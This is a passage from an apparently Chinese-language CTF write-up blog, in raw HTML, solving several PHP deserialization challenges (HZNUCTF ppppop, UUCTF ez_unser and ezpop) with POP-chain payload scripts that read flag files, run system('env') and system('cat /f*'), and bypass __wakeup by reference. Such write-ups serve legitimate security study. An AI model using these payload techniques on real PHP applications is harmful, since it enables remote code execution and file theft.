class="hljs-variable language_">$this</span>-&gt;str = <span class="hljs-variable">$name</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-variable language_">$this</span>-&gt;str;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;   <span class="hljs-comment">//$this-&gt;source = phar://phar.jpg</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_show</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;source);<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker~&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;params = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$key</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>])) &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">file_get</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$text</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$value</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$text</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们先大概看一遍，然后发现了file_get_contents()这个函数  读取指定路径下文件的内容</p><p>file_get_()——&gt;get——&gt; _get魔术方法 ——&gt;tostring——&gt;上面那个类的echo</p><p>pop链如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">C1e4r</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$c</span>-&gt;params[<span class="hljs-string">&#x27;source&#x27;</span>]=<span class="hljs-string">&quot;/var/www/html/f1ag.php&quot;</span>;<br><span class="hljs-variable">$b</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]=<span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$a</span>-&gt;str=<span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="HZNUCTF-2023-preliminary-ppppop已解决"><a href="#HZNUCTF-2023-preliminary-ppppop已解决" class="headerlink" title="[HZNUCTF 2023 preliminary]ppppop已解决"></a>[HZNUCTF 2023 preliminary]ppppop已解决</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;utils.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$className</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$funcName</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$args</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;className;<br>        <span class="hljs-variable">$funcName</span> = <span class="hljs-variable language_">$this</span>-&gt;funcName;<br>        <span class="hljs-variable">$class</span>-&gt;<span class="hljs-variable">$funcName</span>(<span class="hljs-variable language_">$this</span>-&gt;args);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$arg</span></span>) </span>&#123;<br>        <span class="hljs-variable">$func</span>(<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">checkUser</span>()) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$payload</span> = <span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]));<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$payload</span>);<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>这一题的话跟学校新生赛有一道题很像 我感觉出处就是这里</p><p>就是进行一个cookie身份验证 然后可以得到代码</p><p>这个代码相对来说较为简单</p><p>让className为B 可以触发call魔术方法 然后下面就是进行一个命令执行 读取环境变量 env 就可以得到flag 否则的话的去其他目录下面寻找</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;utils.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$className</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$funcName</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$args</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;className;<br>        <span class="hljs-variable">$funcName</span> = <span class="hljs-variable language_">$this</span>-&gt;funcName;<br>        <span class="hljs-variable">$class</span>-&gt;<span class="hljs-variable">$funcName</span>(<span class="hljs-variable language_">$this</span>-&gt;args);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$arg</span></span>) </span>&#123;<br>        <span class="hljs-variable">$func</span>(<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br><span class="hljs-variable">$a</span>-&gt;className=<span class="hljs-string">&#x27;B&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;funcName=<span class="hljs-string">&quot;system&quot;</span>;<br><span class="hljs-variable">$a</span>-&gt;args=<span class="hljs-string">&#x27;env&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>)));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="UUCTF-2022-新生赛-ez-unser"><a href="#UUCTF-2022-新生赛-ez-unser" class="headerlink" title="[UUCTF 2022 新生赛]ez_unser"></a>[UUCTF 2022 新生赛]ez_unser</h1><p>下面来看一下利用引用绕过wakeup</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-comment">###very___so___easy!!!!</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-number">1</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b=<span class="hljs-number">2</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;c=<span class="hljs-number">3</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-string">&#x27;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;b=<span class="hljs-variable language_">$this</span>-&gt;c;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/test&quot;:3/i&#x27;</span>,<span class="hljs-variable">$a</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你输入的不正确！！！搞什么！！&quot;</span>);<br>&#125;<br><span class="hljs-variable">$bbb</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br>你输入的不正确！！！搞什么！！<br></code></pre></td></tr></table></figure><p>这个的话在wakeup这里会将a赋为一个空值 然后这样的话我们的eval($this-&gt;a)就不能被执行</p><p>一般来讲 绕过wakeup就是成员属性的数量比实际的大就可以 </p><p>就拿上面来说：将test实例化成对象然后进行反序列化的时候结果如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">1</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">2</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;c&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">3</span>;&#125;<br></code></pre></td></tr></table></figure><p>就是将test”:3 改成test”:4 即可 但你看下面的正则匹配 </p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/test&quot;:3/i&#x27;</span>,$a))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你输入的不正确！！！搞什么！！&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这个值是不能变化的 那么就不能通过这个进行绕过</p><p>这就要引入了一个知识点 ：引用的概念：简单来讲就是两个变量指向的是同一个地址块 所以两个变量其实也就是一个变量了</p><p>我们可以将a和b进行一个引用 再利用下面的</p><p> $this-&gt;b=$this-&gt;c;    c的值赋给了b 说白了也就是给了a</p><p>这样就可以绕过了wakeup 综上所述  pop如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-number">1</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b=<span class="hljs-number">2</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;c=<span class="hljs-number">3</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-string">&#x27;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;b=<span class="hljs-variable language_">$this</span>-&gt;c;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$d</span>-&gt;b=&amp;<span class="hljs-variable">$d</span>-&gt;a;<br><span class="hljs-variable">$d</span>-&gt;c=<span class="hljs-string">&#x27;system(&quot;cat /f*&quot;);&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$d</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="UUCTF-2022-新生赛-ezpop"><a href="#UUCTF-2022-新生赛-ezpop" class="headerlink" title="[UUCTF 2022 新生赛]ezpop"></a>[UUCTF 2022 新生赛]ezpop</h1><p>这一题考察的是反序列化利用引用绕过wakeup和利用字符串逃逸构造恶意代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UUCTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>,<span class="hljs-variable">$key</span>,<span class="hljs-variable">$basedata</span>,<span class="hljs-variable">$ob</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-variable">$str</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;key===<span class="hljs-string">&quot;UUCTF&quot;</span>)&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;ob=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$this</span>-&gt;basedata));<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;oh!you should learn PHP unserialize String escape!&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">output</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-title function_ invoke__">rce</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">nothing</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$t</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;b=<span class="hljs-variable language_">$this</span>-&gt;t;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">youwant</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">rce</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$pdata</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;data&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$pdata</span>))<br>&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">UUCTF</span>(<span class="hljs-variable">$pdata</span>));<br>    <span class="hljs-variable">$data_replace</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;hacker&quot;</span>,<span class="hljs-string">&quot;loveuu!&quot;</span>,<span class="hljs-variable">$data</span>);<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data_replace</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这个引用绕过 wakeup 上面那一题跟这个很像 所以就不再过多的简述</p><p>链子如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">output</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span 